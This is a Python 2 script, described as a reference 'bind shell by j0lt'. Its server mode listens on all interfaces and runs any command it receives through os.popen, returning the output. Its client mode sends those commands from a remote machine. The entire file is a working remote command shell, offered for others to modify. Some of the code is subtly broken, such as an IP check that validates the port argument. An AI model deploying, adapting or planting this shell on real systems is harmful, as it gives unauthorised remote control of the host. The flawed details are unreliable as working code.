# Require python2 
# Bind shell by j0lt
# This script is just for giving reference that how bind shell look like in python, you can modify as per your need.
# Usage Format :
#   For Running Server : shaker.py server [port]
#   For Running client : shaker.py client [port] [ip of server]

import socket
from sys import argv
from os import _exit
import json
from zlib import compress,decompress
from platform import system


class server:

    def __init__(self,port):
        self.ip = socket.gethostbyname('0.0.0.0')
        self.port = port
        self.l = "cd"
        self.o = system()
        if self.o == "Linux":
            self.l = "pwd"

    def start(self):
        try:
            so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            so.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            so.bind((self.ip,self.port))
        except socket.error:
            print "There is some error with address...\t The Server could not be started"
            _exit(1)
        try:
            so.listen(1)
            host = socket.gethostbyname(socket.gethostname())
            print "[%s:%s] Waiting for connection ..."%(host,self.port)


            while 1:

                ob , address = so.accept()
                print "Connected with %s "%address[0]
                ob.send(compress(json.dumps({"msg":"Connected With %s os at %s"%(self.o,host) , "location":self.__cmd(self.l)[1]}).encode()))
                while 1:
                    try:
                        command = ob.recv(2048)
                        assert(command != "exit")
                        reply = self.__cmd(command)
                        data = json.dumps({"output":reply[0], "location":reply[1]})
                        ob.send(compress(data.encode()))
                    except socket.error:
                        print "Connection Ended..\n Reconnecting..."
                        break
                    except (KeyboardInterrupt,AssertionError):
                        print "Stoping server .."
                        ob.send("Server Stopped..")
                        ob.close()
                        so.close()
                        _exit(1)

        except socket.error:
            print "Connection problem .."
            so.close()
            _exit(1)
        except KeyboardInterrupt:
            print "Stoping server .."
            so.close()
            _exit(1)

    def __cmd(self,command):
        from os import popen
        try:
            q = popen(self.l).read()
            o = popen(command).read()

            return (o,q)
        except:
            return "Sorry!! Command not executed"

class client:

    def __init__(self,ip, port):
        self.ip = ip
        self.port = port

    def start(self):
            so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            while 1:
                try:
                    so.connect((self.ip,self.port))
                    data = json.loads(decompress(so.recv(2048)).decode())
                    print data.get('msg')
                except socket.error:
                    print "Connection Error ... or Server is down"
                    if raw_input("Try Reconnect[Y/n]").lower() == 'n':
                        _exit(1)
                    else:
                        continue

                while 1:
                    try:

                        a = raw_input('%s>'%data.get('location').replace('\n',''))
                        so.sendall(a)
                        assert(a.lower() != 'exit')
                        data = json.loads(decompress(so.recv(2048)).decode())
                        print data.get('output')
                    except (socket.error,AssertionError) :
                        print "Server Disconnected"
                        so.close()
                        _exit(1)

if __name__ == "__main__":

    try:
        assert(argv[1].lower() in ["client", "server"])
        assert (int(argv[2]) in range(1, 65535))

        port = int(argv[2])
        if argv[1].lower() == "client":
            ip = argv[3]
            assert (socket.inet_aton(argv[2]))
            s = client(ip, port)
            s.start()

        else:
            s = server(port)
            s.start()

    except:
        print "The Parameter provided are wrong \n\n\tUsage Format : shaker.py [client/server] [port] [ip{just for client}]"
        _exit(1)

